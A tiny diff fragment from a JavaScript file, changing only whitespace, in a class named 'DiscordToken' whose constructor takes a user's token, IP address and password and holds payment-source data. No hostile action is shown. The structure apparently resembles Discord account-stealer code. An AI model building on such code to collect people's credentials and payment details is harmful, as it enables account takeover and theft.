@@ -1,7 +1,7 @@
 "use strict";
 const request = require("sync-request");
 
-module.exports = class DiscordToken {
+module.exports = class DiscordToken { 
   constructor(token, ipAddress, password) {
     this.info = {};
     this.paymentSources = "";
